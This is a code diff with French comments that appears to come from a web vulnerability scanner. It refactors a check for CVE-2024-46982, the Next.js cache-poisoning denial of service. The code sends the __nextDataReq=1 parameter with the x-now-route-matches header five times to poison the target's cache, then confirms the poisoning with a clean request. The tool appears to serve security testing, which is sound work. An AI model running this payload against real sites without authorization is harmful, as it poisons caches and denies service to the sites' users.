@@ -14,15 +14,29 @@ from utils.utils import configure_logger, requests, sys
 logger = configure_logger(__name__)
 
 
-def nextjsdos(
+def test_nextjs_dos(
     url: str,
     uri: str,
     s: requests.Session,
     authent: tuple[str, str] | None = None,
-) -> None:
+) -> bool:
+    """
+    Teste l'exploitation du CVE-2024-46982 (DoS via cache poisoning)
+    
+    Args:
+        url: URL de base
+        uri: URI avec payload __nextDataReq=1
+        s: Session requests
+        authent: Credentials HTTP Basic optionnels
+        
+    Returns:
+        True si exploitable (cache poisonné), False sinon
+    """
     headers = {"x-now-route-matches": "1"}
-    for _ in range(0, 5):
-        reqdos = s.get(
+    
+    # Empoisonnement du cache avec 5 requêtes
+    for _ in range(5):
+        s.get(
             uri,
             headers=headers,
             verify=False,
@@ -30,19 +44,32 @@ def nextjsdos(
             timeout=10,
             allow_redirects=False,
         )
-    reqverify = s.get(
-        url, verify=False, auth=authent, timeout=10, allow_redirects=False
+    
+    # Vérification de l'empoisonnement avec requête clean
+    req_verify = s.get(
+        url,
+        verify=False,
+        auth=authent,
+        timeout=10,
+        allow_redirects=False
     )
-    req = reqdos  # Assign req to reqdos for the following check
-    if "pageProps" in req.text or "__N_SSP" in req.text or len(reqdos.content) == len(reqverify.content):
-        try:
-            reqverify.json()
-            print(f" {Identify.confirmed} | CVE-2024-46982 | {uri} | PAYLOAD: {headers}")
-        except requests.exceptions.JSONDecodeError:
-            if "application/json" in reqverify.headers.get("Content-Type", ""):
-                print(f" {Identify.confirmed} | CVE-2024-46982 | {uri} | PAYLOAD: {headers}")
-            else:
-                pass
+    
+    # Vérifier si la réponse JSON persiste sans le header malveillant
+    try:
+        req_verify.json()
+        print(
+            f" {Identify.confirmed} | CVE-2024-46982 | CACHE POISONED | {Colors.BLUE}{uri}{Colors.RESET}"
+        )
+        return True
+    except requests.exceptions.JSONDecodeError:
+        # Vérifier si Content-Type est JSON même si le parsing échoue
+        if "application/json" in req_verify.headers.get("Content-Type", ""):
+            print(
+                f" {Identify.confirmed} | CVE-2024-46982 | CACHE POISONED | {Colors.BLUE}{uri}{Colors.RESET}"
+            )
+            return True
+    
+    return False
 
 
 def datareq_check(
@@ -52,8 +79,18 @@ def datareq_check(
     custom_header: dict,
     authent: tuple[str, str] | None,
 ) -> None:
-
+    """
+    Vérifie la vulnérabilité CVE-2024-46982 (Next.js __nextDataReq cache poisoning)
+    
+    Args:
+        url: URL cible
+        s: Session requests
+        req_main: Réponse baseline de la page
+        custom_header: Headers personnalisés
+        authent: Credentials HTTP Basic optionnels
+    """
     uri = f"{url}?__nextDataReq=1"
+    
     try:
         req = s.get(
             uri,
@@ -64,28 +101,46 @@ def datareq_check(
             timeout=10,
         )
 
-        if "pageProps" in req.text or "__N_SSP" in req.text and len(req.content) != len(req_main.content):
+        # Vérifier les marqueurs Next.js ET que la réponse est différente
+        has_nextjs_markers = ("pageProps" in req.text or "__N_SSP" in req.text)
+        is_different_response = len(req.content) != len(req_main.content)
+        
+        if has_nextjs_markers and is_different_response:
             print(
                 f" {Identify.behavior} | CVE-2024-46982 | TAG OK | {Colors.BLUE}{uri}{Colors.RESET} | PAYLOAD: x-now-route-matches: 1"
             )
+            
+            # Envoyer requête à Burp si proxy activé
             if proxy.proxy_enabled:
                 from utils.proxy import proxy_request
-
                 proxy_request(
-                    s, "GET", uri, headers={"x-now-route-matches": "1"}, data=None
+                    s,
+                    "GET",
+                    uri,
+                    headers={"x-now-route-matches": "1"},
+                    data=None
                 )
+            
+            # Trouver une page sans risque pour tester l'exploitation
             unrisk_page = get_unrisk_page(url, s, req)
+            
             if unrisk_page:
-                uri = f"{unrisk_page}?__nextDataReq=1"
-                nextjsdos(unrisk_page, uri, s)
+                uri_exploit = f"{unrisk_page}?__nextDataReq=1"
+                exploitable = test_nextjs_dos(unrisk_page, uri_exploit, s, authent)
+                
+                if not exploitable:
+                    print(
+                        " └─ [i] Cache poisoning detected but exploitation failed. Manual verification recommended."
+                    )
             else:
                 print(
-                    " └─ [i] [CVE-2024-46982] No risk-free pages found. Please do a manual check."
+                    " └─ [i] [CVE-2024-46982] No risk-free pages found. Manual check required."
                 )
+                
     except requests.Timeout as t:
         logger.error(f"request timeout {uri}: {t}")
     except KeyboardInterrupt:
         print("Exiting")
         sys.exit()
-    except Exception:
-        logger.exception(f"request error {uri}")
+    except Exception as e:
+        logger.exception(f"request error {uri}: {e}")
